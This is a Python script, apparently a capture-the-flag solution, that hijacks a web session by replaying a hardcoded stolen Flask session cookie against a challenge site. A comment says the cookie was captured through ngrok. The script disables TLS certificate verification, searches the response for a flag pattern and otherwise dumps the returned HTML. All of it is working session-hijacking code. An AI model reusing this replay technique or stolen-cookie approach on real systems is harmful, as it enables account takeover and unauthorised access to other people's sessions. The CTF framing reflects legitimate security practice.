import requests
import urllib3
import re

# Suppress the annoying warning about unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The public URL of the CTF challenge
TARGET_URL = "https://ponder.cbd2026.cloud" 
# The endpoint where the flag is likely located (might be /, /admin, /flag, /dashboard, etc.)
ENDPOINT = "/" 

# The Flask session cookie you captured via ngrok
STOLEN_COOKIE = "eyJ1c2VyX2lkIjo1fQ.afdUgw.wYm4w9tjYM4WIaVLVH1oJw0apM0"

def get_flag():
    url = TARGET_URL + ENDPOINT
    
    cookies = {
        "session": STOLEN_COOKIE
    }

    print(f"[*] Sending request to {url} with hijacked session...")
    
    try:
        # Added verify=False to bypass the self-signed cert error
        response = requests.get(url, cookies=cookies, verify=False)
        
        print(f"[*] Response Status Code: {response.status_code}")
        
        # Search the response text for a typical flag format. 
        flag_match = re.search(r'(cbd\{.*?\}|flag\{.*?\})', response.text, re.IGNORECASE)
        
        if flag_match:
            print("\n[+] FLAG FOUND!")
            print(f"    {flag_match.group(0)}")
        else:
            print("\n[-] Flag not found in the immediate response. Dumping HTML so you can inspect it:")
            print("-" * 40)
            print(response.text[:1000] + "\n...[truncated]...")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Error making request: {e}")

if __name__ == "__main__":
    get_flag()
